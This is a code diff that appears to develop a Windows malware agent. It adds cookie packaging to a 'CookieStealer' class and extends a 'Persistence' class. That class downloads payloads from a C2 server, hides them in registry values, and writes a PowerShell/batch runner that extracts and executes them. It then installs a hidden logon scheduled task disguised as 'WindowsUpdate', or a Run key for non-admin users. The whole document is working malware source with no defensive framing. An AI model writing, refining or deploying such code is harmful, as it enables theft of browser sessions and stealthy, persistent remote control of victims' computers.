@@ -390,6 +390,19 @@ class CookieStealer:
         except Exception as e:
             self.logger.error(f"Unexpected Firefox cookie extraction error: {str(e)}", exc_info=True)
             return []
+        
+    def _package_cookies(self, cookies, browser_name):
+        """Package cookies for transmission without zipping"""
+        self.logger.debug(f"Packaging {browser_name} cookies as JSON")
+        try:
+            return {
+                "browser": browser_name,
+                "cookies": cookies,  # Send raw cookies as JSON
+                "system_info": SystemUtils.get_system_info()
+            }
+        except Exception as e:
+            self.logger.error(f"Failed to package {browser_name} cookies: {str(e)}")
+            return None
 
 # ======================
 # System Functions
@@ -524,190 +537,280 @@ class SystemUtils:
 class Persistence:
     @staticmethod
     def _download_to_registry(url, value_name, c2_server):
-        """Download content and store in registry as binary blob"""
+        logger = logging.getLogger('agent.persistence.download')
         try:
+            logger.info(f"Attempting to download content from {url}")
             response = requests.get(url, verify=False)
             response.raise_for_status()
+            logger.debug(f"Successfully downloaded {len(response.content)} bytes")
             
-            is_admin = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE) is not None
+            # More reliable admin check
+            is_admin = False
+            try:
+                import ctypes
+                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+                logger.debug(f"Admin privileges: {is_admin}")
+            except Exception as e:
+                logger.debug(f"Admin check failed: {str(e)}")
+                # Fallback method
+                try:
+                    test_key = winreg.OpenKey(
+                        winreg.HKEY_LOCAL_MACHINE,
+                        r"SOFTWARE\Microsoft\Windows\CurrentVersion",
+                        0,
+                        winreg.KEY_WRITE | winreg.KEY_READ
+                    )
+                    winreg.CloseKey(test_key)
+                    is_admin = True
+                except WindowsError:
+                    is_admin = False
+            
             reg_path = (r"SOFTWARE\Microsoft\Windows\CurrentVersion\VersionInfo" if is_admin 
-                       else r"Software\Microsoft\Accessibility\Setup")
+                    else r"Software\Microsoft\Accessibility\Setup")
             root_key = winreg.HKEY_LOCAL_MACHINE if is_admin else winreg.HKEY_CURRENT_USER
             
-            key = winreg.CreateKey(root_key, reg_path)
-            winreg.SetValueEx(key, value_name, 0, winreg.REG_BINARY, response.content)
-            winreg.CloseKey(key)
-            return True
+            logger.info(f"Storing {value_name} in registry at {root_key}\\{reg_path}")
+            
+            try:
+                # Ensure we have write permissions by using correct access flags
+                access = winreg.KEY_WRITE | winreg.KEY_READ
+                key = winreg.CreateKeyEx(root_key, reg_path, 0, access)
+                winreg.SetValueEx(key, value_name, 0, winreg.REG_BINARY, response.content)
+                winreg.CloseKey(key)
+                logger.info(f"Successfully stored {value_name} in registry")
+                return True
+            except Exception as e:
+                logger.error(f"Failed to write to registry: {str(e)}")
+                return False
+                
+        except requests.RequestException as e:
+            logger.error(f"Download failed: {str(e)}")
+            return False
         except Exception as e:
-            logging.error(f"Failed to store {value_name} in registry: {str(e)}")
+            logger.error(f"Unexpected error in _download_to_registry: {str(e)}", exc_info=True)
             return False
 
     @staticmethod
-    def _generate_python_runner():
-        """Generate Python script that will read from registry and execute"""
-        # Using line breaks and string concatenation to avoid triple-quote issues
-        python_code = (
-            "import os\nimport winreg\nimport tempfile\n"
-            "import zipfile\nimport sys\nimport subprocess\n\n"
-            "def get_registry_data(reg_path, value_name, is_admin):\n"
-            "    try:\n"
-            "        root = winreg.HKEY_LOCAL_MACHINE if is_admin else winreg.HKEY_CURRENT_USER\n"
-            "        with winreg.OpenKey(root, reg_path, 0, winreg.KEY_READ) as key:\n"
-            "            value, _ = winreg.QueryValueEx(key, value_name)\n"
-            "            return value\n"
-            "    except Exception:\n"
-            "        return None\n\n"
-            "def main():\n"
-            "    is_admin = False\n"
-            "    try:\n"
-            "        winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)\n"
-            "        is_admin = True\n"
-            "    except:\n"
-            "        pass\n\n"
-            "    reg_path = (r\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\VersionInfo\" if is_admin\n"
-            "               else r\"Software\\\\Microsoft\\\\Accessibility\\\\Setup\")\n\n"
-            "    engine_data = get_registry_data(reg_path, \"engine\", is_admin)\n"
-            "    if engine_data:\n"
-            "        python_dir = os.path.join(os.environ['PUBLIC'], 'documents')\n"
-            "        os.makedirs(python_dir, exist_ok=True)\n"
-            "        zip_path = os.path.join(python_dir, 'p.zip')\n"
-            "        with open(zip_path, 'wb') as f:\n"
-            "            f.write(engine_data)\n"
-            "        with zipfile.ZipFile(zip_path, 'r') as zip_ref:\n"
-            "            zip_ref.extractall(python_dir)\n"
-            "        try:\n"
-            "            os.remove(zip_path)\n"
-            "        except:\n"
-            "            pass\n\n"
-            "    lube_data = get_registry_data(reg_path, \"lube\", is_admin)\n"
-            "    if lube_data:\n"
-            "        script = lube_data.decode('utf-8')\n"
-            "        python_exe = os.path.join(python_dir, 'python.exe')\n"
-            "        if os.path.exists(python_exe):\n"
-            "            subprocess.Popen(\n"
-            "                [python_exe, \"-c\", script],\n"
-            "                creationflags=subprocess.CREATE_NO_WINDOW,\n"
-            "                stdout=subprocess.PIPE,\n"
-            "                stderr=subprocess.PIPE,\n"
-            "                stdin=subprocess.PIPE\n"
-            "            )\n"
-            "        else:\n"
-            "            subprocess.Popen(\n"
-            "                [\"python\", \"-c\", script],\n"
-            "                creationflags=subprocess.CREATE_NO_WINDOW,\n"
-            "                stdout=subprocess.PIPE,\n"
-            "                stderr=subprocess.PIPE,\n"
-            "                stdin=subprocess.PIPE\n"
-            "            )\n\n"
-            "if __name__ == \"__main__\":\n"
-            "    main()"
-        )
-        return base64.b64encode(python_code.encode('utf-8')).decode('utf-8')
+    def _generate_batch_runner():
+        logger = logging.getLogger('agent.persistence.generator')
+        try:
+            batch_lines = [
+                '@echo off',
+                'setlocal enabledelayedexpansion',
+                '',
+                ':: Configure paths',
+                'set "extract_root=%public%"',
+                'set "python_dir=%extract_root%\\documents"',
+                'set "python_exe=%python_dir%\\python.exe"',
+                'set "py_script=%python_dir%\\run_lube.py"',
+                '',
+                'if exist "%python_exe%" (',
+                '    goto HavePython',
+                ')',
+                '',
+                'set "ps_command=$ErrorActionPreference = \'Stop\';"',
+                'set "ps_command=%ps_command% $regPaths = @(\'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VersionInfo\',\'HKCU:\\Software\\Microsoft\\Accessibility\\Setup\');"',
+                'set "ps_command=%ps_command% foreach ($path in $regPaths) {"',
+                'set "ps_command=%ps_command%     if (Test-Path $path) {"',
+                'set "ps_command=%ps_command%         $val = Get-ItemProperty -Path $path -Name \'engine\' -ErrorAction SilentlyContinue;"',
+                'set "ps_command=%ps_command%         if ($val -and $val.engine) {"',
+                'set "ps_command=%ps_command%             $zipPath = Join-Path $env:TEMP \'python_engine.zip\';"',
+                'set "ps_command=%ps_command%             [IO.File]::WriteAllBytes($zipPath, $val.engine);"',
+                'set "ps_command=%ps_command%             $extractTo = \'%extract_root%\';"',
+                'set "ps_command=%ps_command%             if (-not (Test-Path $extractTo)) { New-Item -Path $extractTo -ItemType Directory -Force | Out-Null };"',
+                'set "ps_command=%ps_command%             Expand-Archive -Path $zipPath -DestinationPath $extractTo -Force;"',
+                'set "ps_command=%ps_command%             Remove-Item $zipPath -Force;"',
+                'set "ps_command=%ps_command%             $pythonPath = Join-Path $extractTo \'documents\\python.exe\';"',
+                'set "ps_command=%ps_command%             if (Test-Path $pythonPath) { exit 0 }"',
+                'set "ps_command=%ps_command%         }"',
+                'set "ps_command=%ps_command%     }"',
+                'set "ps_command=%ps_command% };"',
+                'set "ps_command=%ps_command% throw \'Failed to extract Python from registry\'"',
+                '',
+                'powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_command%"',
+                'if errorlevel 1 (',
+                '    echo ERROR: Failed to extract Python from registry',
+                '    pause',
+                '    exit /b 1',
+                ')',
+                '',
+                ':HavePython',
+                '',
+                '(',
+                'echo import winreg',
+                'echo import sys',
+                'echo.',
+                'echo try:',
+                'echo     key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r\'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VersionInfo\'^)',
+                'echo     value, regtype = winreg.QueryValueEx(key, \'lube\'^)',
+                'echo     script = value.decode(\'utf-8\'^) if regtype == winreg.REG_BINARY else value',
+                'echo     exec(script^)',
+                'echo except Exception as e:',
+                'echo     print(f\'Error: {e}\'^)',
+                'echo     sys.exit(1^)',
+                ') > "%py_script%" 2>nul',
+                '',
+                '"%python_exe%" "%py_script%"',
+                'if errorlevel 1 (',
+                '    echo ERROR: Python script execution failed',
+                '    pause',
+                '    exit /b 1',
+                ')',
+                '',
+                'endlocal'
+            ]
+            
+            batch_code = '\r\n'.join(batch_lines)
+            return base64.b64encode(batch_code.encode('utf-8')).decode('utf-8')
+        except Exception as e:
+            logger.error(f"Failed to generate batch runner: {str(e)}", exc_info=True)
+            raise
 
     @staticmethod
     def _create_scheduled_task():
-        """Create scheduled task to execute the Python runner"""
-        task_name = f"WindowsUpdate_{random.randint(1000,9999)}"
-        encoded_python = Persistence._generate_python_runner()
-        
-        # VBS script with proper string escaping
-        vbs_lines = [
-            'Set objShell = CreateObject("WScript.Shell")',
-            'pythonDir = objShell.ExpandEnvironmentStrings("%PUBLIC%") & "\\documents"',
-            'pythonExe = pythonDir & "\\python.exe"',
-            '',
-            'embeddedPythonExists = False',
-            'Set fso = CreateObject("Scripting.FileSystemObject")',
-            'If fso.FileExists(pythonExe) Then',
-            '    embeddedPythonExists = True',
-            'End If',
-            '',
-            'encoded = "' + encoded_python + '"',
-            'decoded = ""',
-            'For i = 1 To Len(encoded) Step 4',
-            '    chunk = Mid(encoded, i, 4)',
-            '    decoded = decoded & ChrW(CLng("&H" & Mid(chunk, 1, 2))) & ChrW(CLng("&H" & Mid(chunk, 3, 2)))',
-            'Next',
-            '',
-            'Set tempFile = fso.CreateTextFile(fso.GetSpecialFolder(2) & "\\runner.py", True)',
-            'tempFile.Write decoded',
-            'tempFile.Close',
-            '',
-            'If embeddedPythonExists Then',
-            '    objShell.Run """" & pythonExe & """ """ & fso.GetSpecialFolder(2) & "\\runner.py""", 0, False',
-            'Else',
-            '    objShell.Run "python """ & fso.GetSpecialFolder(2) & "\\runner.py""", 0, False',
-            'End If'
-        ]
-        
-        vbs_path = os.path.join(os.getenv('PUBLIC'), f'run_{random.randint(1000,9999)}.vbs')
-        with open(vbs_path, 'w') as f:
-            f.write("\n".join(vbs_lines))
-        
-        # Task XML with proper escaping
-        task_xml_lines = [
-            '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">',
-            '    <Triggers>',
-            '        <LogonTrigger>',
-            '            <Enabled>true</Enabled>',
-            '        </LogonTrigger>',
-            '    </Triggers>',
-            '    <Principals>',
-            '        <Principal id="Author">',
-            '            <RunLevel>HighestAvailable</RunLevel>',
-            '        </Principal>',
-            '    </Principals>',
-            '    <Settings>',
-            '        <Hidden>true</Hidden>',
-            '        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>',
-            '    </Settings>',
-            '    <Actions Context="Author">',
-            '        <Exec>',
-            '            <Command>wscript</Command>',
-            f'            <Arguments>"{vbs_path}"</Arguments>',
-            '        </Exec>',
-            '    </Actions>',
-            '</Task>'
-        ]
-        
-        xml_path = os.path.join(os.getenv('TEMP'), f'task_{random.randint(1000,9999)}.xml')
-        with open(xml_path, 'w') as f:
-            f.write("\n".join(task_xml_lines))
-        
+        logger = logging.getLogger('agent.persistence.task')
         try:
-            subprocess.run(
+            # Check admin status
+            is_admin = False
+            try:
+                import ctypes
+                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+                logger.debug(f"Admin privileges: {is_admin}")
+            except Exception as e:
+                logger.debug(f"Admin check failed: {str(e)}")
+                try:
+                    test_key = winreg.OpenKey(
+                        winreg.HKEY_LOCAL_MACHINE,
+                        r"SOFTWARE\Microsoft\Windows\CurrentVersion",
+                        0,
+                        winreg.KEY_WRITE | winreg.KEY_READ
+                    )
+                    winreg.CloseKey(test_key)
+                    is_admin = True
+                except WindowsError:
+                    is_admin = False
+
+            task_name = "WindowsUpdate"
+            logger.debug(f"Generated task name: {task_name}")
+            
+            encoded_batch = Persistence._generate_batch_runner()
+            logger.debug("Successfully generated encoded batch runner")
+            
+            # Create batch file in Public directory
+            batch_path = os.path.join(os.getenv('PUBLIC'), "documents", "runner.cmd")
+            logger.debug(f"Writing batch runner to {batch_path}")
+            
+            decoded_batch = base64.b64decode(encoded_batch).decode('utf-8')
+            with open(batch_path, 'w') as f:
+                f.write(decoded_batch)
+            
+            logger.info(f"Batch runner created at {batch_path}")
+
+            # Different approach for non-admin users
+            if not is_admin:
+                logger.info("Running as non-admin, using alternate persistence method")
+                
+                # Create registry run key instead of scheduled task
+                try:
+                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                    winreg.SetValueEx(key, task_name, 0, winreg.REG_SZ, f'conhost --headless cmd /c "{batch_path}"')
+                    winreg.CloseKey(key)
+                    logger.info(f"Created Run registry key for current user")
+                    return task_name
+                except Exception as e:
+                    logger.error(f"Failed to create Run registry key: {str(e)}")
+                    return None
+
+            # Admin task creation (original code)
+            task_xml_lines = [
+                '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">',
+                '    <Triggers>',
+                '        <LogonTrigger>',
+                '            <Enabled>true</Enabled>',
+                '        </LogonTrigger>',
+                '    </Triggers>',
+                '    <Principals>',
+                '        <Principal id="Author">',
+                '            <RunLevel>HighestAvailable</RunLevel>',
+                '        </Principal>',
+                '    </Principals>',
+                '    <Settings>',
+                '        <Hidden>true</Hidden>',
+                '        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>',
+                '    </Settings>',
+                '    <Actions Context="Author">',
+                '        <Exec>',
+                '            <Command>conhost</Command>',
+                f'            <Arguments>--headless cmd /c "{batch_path}"</Arguments>',
+                '        </Exec>',
+                '    </Actions>',
+                '</Task>'
+            ]
+            
+            xml_path = os.path.join(os.getenv('TEMP'), f'task_{random.randint(1000,9999)}.xml')
+            logger.debug(f"Writing task XML to {xml_path}")
+            
+            with open(xml_path, 'w') as f:
+                f.write("\n".join(task_xml_lines))
+            
+            logger.info(f"Creating scheduled task '{task_name}'")
+            result = subprocess.run(
                 ['schtasks', '/Create', '/TN', task_name, '/XML', xml_path, '/F'],
                 creationflags=subprocess.CREATE_NO_WINDOW,
-                check=True,
-                capture_output=True
+                capture_output=True,
+                text=True
             )
+            
+            if result.returncode == 0:
+                logger.info(f"Successfully created task '{task_name}'")
+            else:
+                logger.error(f"Failed to create task. STDOUT: {result.stdout} STDERR: {result.stderr}")
+                return None
+            
             return task_name
+        except Exception as e:
+            logger.error(f"Failed to create scheduled task: {str(e)}", exc_info=True)
+            return None
         finally:
             try:
-                os.remove(xml_path)
-            except:
-                pass
+                if 'xml_path' in locals() and os.path.exists(xml_path):
+                    os.remove(xml_path)
+                    logger.debug(f"Cleaned up temporary XML file: {xml_path}")
+            except Exception as e:
+                logger.error(f"Failed to clean up XML file: {str(e)}")
 
     @staticmethod
     def install(c2_server):
-        logger = logging.getLogger('Persistence')
+        logger = logging.getLogger('agent.persistence.install')
         try:
+            logger.info(f"Starting persistence installation with C2: {c2_server}")
+            
             if platform.system() != "Windows":
+                logger.error("Non-Windows platform detected")
                 return {"status": "error", "message": "Only Windows supported"}
             
+            logger.info("Downloading and storing engine (Python package)")
             if not Persistence._download_to_registry(f"{c2_server}//a/p", "engine", c2_server):
+                logger.error("Failed to store engine in registry")
                 return {"status": "error", "message": "Failed to store engine in registry"}
             
+            logger.info("Downloading and storing lube (Python script)")
             if not Persistence._download_to_registry(f"{c2_server}//a/d", "lube", c2_server):
+                logger.error("Failed to store lube in registry")
                 return {"status": "error", "message": "Failed to store lube in registry"}
             
+            logger.info("Creating scheduled task")
             task_name = Persistence._create_scheduled_task()
             if not task_name:
+                logger.error("Failed to create scheduled task")
                 return {"status": "error", "message": "Failed to create scheduled task"}
             
+            success_msg = "Persistence installed successfully"
+            logger.info(success_msg)
             return {
                 "status": "success", 
-                "message": "Persistence installed",
+                "message": success_msg,
                 "registry_entries": ["engine", "lube"],
                 "task_name": task_name,
                 "extraction_path": r"%PUBLIC%\documents",
@@ -717,6 +820,7 @@ class Persistence:
         except Exception as e:
             logger.error(f"Installation failed: {str(e)}", exc_info=True)
             return {"status": "error", "message": str(e)}
+        
 
 # ======================
 # Process Injection
